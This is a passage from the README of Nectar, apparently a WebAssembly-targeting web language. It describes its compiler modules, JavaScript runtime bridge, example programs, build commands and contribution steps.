| **Module Loader** | `module_loader.rs` | Loads and merges multi-file projects |
| **Package** | `package.rs` | `Nectar.toml` manifest parsing and lockfile management |
| **Registry** | `registry.rs` | Package registry client for dependency downloads |
| **Resolver** | `resolver.rs` | Dependency version resolution |
| **Stdlib** | `stdlib.rs` | Built-in standard library definitions |

---

## Runtime

Nectar compiles to WebAssembly, which cannot directly access the DOM or browser APIs. The **runtime bridge** (`runtime/`) is a set of lightweight JavaScript modules that provide the host functions WASM imports at instantiation.

The runtime is intentionally minimal -- there is no virtual DOM, no diffing algorithm, and no framework overhead. Nectar uses fine-grained reactivity (signals) to surgically update only the DOM nodes that depend on changed state.

| Runtime Module | Purpose |
|---|---|
| `nectar-runtime.js` | Core DOM bridge (`createElement`, `setText`, `appendChild`, `setAttribute`, `addEventListener`), signal/effect reactivity engine, HTTP fetch bridge, Web Worker concurrency, AI/LLM interaction, WebSocket/SSE streaming, router, accessibility helpers, and Web API bindings (localStorage, clipboard, timers, IntersectionObserver, etc.) |
| `nectar-ssr-runtime.js` | Node.js server-side rendering -- provides a mock DOM that collects HTML strings instead of creating real nodes. Exports `renderToString()` and `renderToStream()`. |
| `nectar-hydration.js` | Attaches interactivity to server-rendered HTML. Walks existing DOM nodes, matches hydration markers, and binds signals and event handlers without recreating the tree. |
| `nectar-hot-reload.js` | Development-mode hot module replacement. Connects to the dev server via WebSocket, swaps WASM modules on file change, and preserves signal state across reloads. |
| `nectar-test-runner.js` | Executes compiled test WASM modules in Node.js and reports pass/fail results. |
| `nectar-test-renderer.js` | Virtual DOM test renderer for component testing -- mount components, query by text/role/attribute, simulate clicks and input. |

---

## Examples

The `examples/` directory contains complete programs demonstrating Nectar's features.

| File | Description |
|---|---|
| [`hello.nectar`](examples/hello.nectar) | Hello World -- components, props, render templates |
| [`counter.nectar`](examples/counter.nectar) | Interactive counter -- state, signals, event handlers, ownership |
| [`todo.nectar`](examples/todo.nectar) | Todo app -- structs, enums, ownership, collections, pattern matching |
| [`store.nectar`](examples/store.nectar) | Global stores -- signals, actions, computed values, effects, async actions |
| [`app.nectar`](examples/app.nectar) | Full application -- routing, scoped styles, route guards, `<Link>` navigation |
| [`api.nectar`](examples/api.nectar) | API communication -- fetch, async/await, GET/POST/DELETE, error handling |
| [`ai-chat.nectar`](examples/ai-chat.nectar) | AI chat interface -- `agent` keyword, tool definitions, streaming responses |
| [`contracts.nectar`](examples/contracts.nectar) | API boundary contracts -- compile-time field checking, runtime validation, content hashing |
| [`security.nectar`](examples/security.nectar) | Security features -- `secret` types, `permissions` blocks, capability enforcement |
| [`pwa-app.nectar`](examples/pwa-app.nectar) | Progressive Web App -- `app` manifest, offline caching, gestures, hardware access |
| [`seo.nectar`](examples/seo.nectar) | SEO & AAIO -- `page` keyword, `meta` blocks, structured data, auto sitemap, semantic HTML |

Compile any example:

```bash
nectar build examples/counter.nectar --emit-wasm
nectar build examples/app.nectar --ssr
nectar build examples/todo.nectar -O2 --emit-wasm
```

---

## Contributing

### Building from source

```bash
git clone https://github.com/BlakeBurnette/nectar-lang.git
cd nectar-lang
cargo build
```

### Running the test suite

```bash
cargo test
```

### Project structure

```
nectar-lang/
  compiler/
    src/
      main.rs          # CLI entry point
      lexer.rs         # Tokenizer
      parser.rs        # Parser
      ast.rs           # AST definitions
      codegen.rs       # WASM code generation
      ...              # (see Architecture section)
  runtime/
    nectar-runtime.js     # Browser runtime bridge
    nectar-ssr-runtime.js # SSR runtime
    nectar-hydration.js   # Hydration runtime
    nectar-hot-reload.js  # HMR client
    nectar-test-runner.js # Test execution
    nectar-test-renderer.js # Component test renderer
  examples/
    hello.nectar
    counter.nectar
    todo.nectar
    store.nectar
    app.nectar
    api.nectar
    ai-chat.nectar
    seo.nectar
```

### How to contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/my-feature`)
3. Make your changes
4. Run `cargo test` and `cargo clippy` to verify
5. Submit a pull request

Bug reports, feature requests, and documentation improvements are all welcome. Please open an issue before starting significant work to discuss the approach.

---

## License

MIT License. See [LICENSE](LICENSE) for details.
